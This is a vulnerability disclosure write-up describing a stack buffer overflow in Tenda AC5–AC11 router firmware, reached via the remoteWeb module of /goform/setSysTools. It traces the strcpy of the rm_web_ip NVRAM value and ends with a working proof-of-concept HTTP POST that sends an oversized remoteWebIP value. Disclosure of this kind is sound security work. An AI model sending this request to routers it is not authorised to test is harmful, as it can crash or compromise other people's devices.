# Tenda Router Vulnerability

This vulnerability exists in  module `remoteWeb` of  `/goform/setSysTools`  and affects multiple devices of the Tenda Router. Equipment models include AC5, AC6, AC7, AC8, AC10, AC11. It affects several firmware versions, including the latest version number published on the official website. And it is RTOS system.

[https://www.tenda.com.cn/searchdown/AC.html](https://www.tenda.com.cn/searchdown/AC.html)

## Vulnerability description

（The pseudocode for the example is the last version of AC6）

There is a stack buffer overflow vulnerability in the `sub_80073B88` function.(page  /goform/setSysTools in module remoteWeb)

![pic/Untitled.png](pic/Untitled.png)
![pic/Untitled1.png](pic/Untitled1.png)


In this function, when remote web administration is enable，it will use `nvram_get("rm_web_ip");` to get an NVRAM variable, which is then placed in a `V5` variable. After that ,it will use `Strcpy (v6, v5);` to put V5 on V6 without any security check.

The  `rm_web_ip`  NVRAM variable can be controlled in the `cgi_lib_set_remote_info` function.

![pic/Untitled2.png](pic/Untitled2.png)

You can see that it's assigned by `v10`.
![pic/Untitled3.png](pic/Untitled3.png)


Initially `v9` `v10` is what we inputed, so the `rm_web_ip` NVRAM variable becomes manageable. Of course, the value of v9 cannot be 'any'.

`sub_800119F4((int)"rm_web_ip", v10)`  is required to return 0 in order to set the `rm_web_ip` NVRAM variable properly.
![pic/Untitled4.png](pic/Untitled4.png)


In the function `sub_800119F4`, it will first get the original NVRAM variable of `rm_web_ip` and compare it with V2. In the `strcmp` function, if two arguments are the same, it returns 0. Therefore, if V2 is different from the original value of the NVRAM variable `rm_web_ip`, the function `sub_800119F4` will return 0.

At this point, the NVRAM variable `rm_web_ip` has been successfully controlled, and then we need to determine how to jump to `sub_80073B88` to trigger the vulnerability.

By looking at the xrefs to  the function `sub_80073B88` ，you can find such a chain of program calls.

`cgi_lib_set_remote_info` → `sub_80073D0C`→`sub_80073B88`

![pic/Untitled5.png](pic/Untitled5.png)

![pic/Untitled6.png](pic/Untitled6.png)

For the process `LABEL_14` in the `cgi_lib_set_remote_info` function, simply make the `remoteWebEn` input false and set a remote administration Web port that is not its own. For example, 9999.

![pic/Untitled7.png](pic/Untitled7.png)
![pic/Untitled8.png](pic/Untitled8.png)


Thus,  setting `remoteWebEn` , `remoteWebPort` and `remoteWebIP` in the remoteWeb module of `/goform/setsystools`, An attacker can easily use elaborate overflow data to perform a denial-of-service attack or remote code execution.

## POC

```
POST /goform/setSysTools HTTP/1.1
Host: 192.168.0.1
Content-Length: 500
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Content-Type: application/x-www-form-urlencoded;
Accept: */*
Origin: http://192.168.0.1
Referer: http://192.168.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

module1=remoteWeb&remoteWebEn=true&remoteWebType=specified&remoteWebIP=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&remoteWebPort=9999
```